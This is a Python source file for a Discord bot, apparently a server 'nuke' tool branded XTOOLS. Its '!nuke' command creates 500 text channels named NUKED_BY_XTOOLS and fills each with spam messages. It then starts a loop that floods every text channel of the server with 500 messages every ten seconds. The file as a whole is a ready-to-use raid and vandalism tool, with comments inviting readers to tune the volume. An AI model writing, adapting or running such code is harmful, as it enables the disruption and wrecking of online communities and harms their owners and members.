import discord
from discord.ext import commands, tasks

TOKEN = 'Your Token!'
PREFIX = '!'

intents = discord.Intents.default()
intents.all()
intents.messages = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@tasks.loop(seconds=10)  # Adjust the interval in seconds as needed
async def spam_channels():
    guild = bot.guilds[0]

    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            for _ in range(500):  # Adjust the number of spam messages to send
                await channel.send("THIS SERVER GOT NUKED BY XTOOLS")

@bot.event
async def on_ready():
    print(f'Bot is online as {bot.user.name}')

@bot.command()
async def nuke(ctx):
    guild = ctx.guild

    # Create channels
    for _ in range(500):  # Adjust the number of channels to create
        created_channel = await guild.create_text_channel('NUKED_BY_XTOOLS')

        # Send multiple messages in each channel
        for _ in range(10):  # Adjust the number of spam messages to send
            await created_channel.send("THIS CHANNEL GOT NUKED BY XTOOLS")

    # Immediately start spamming
    spam_channels.start()

bot.run(TOKEN)
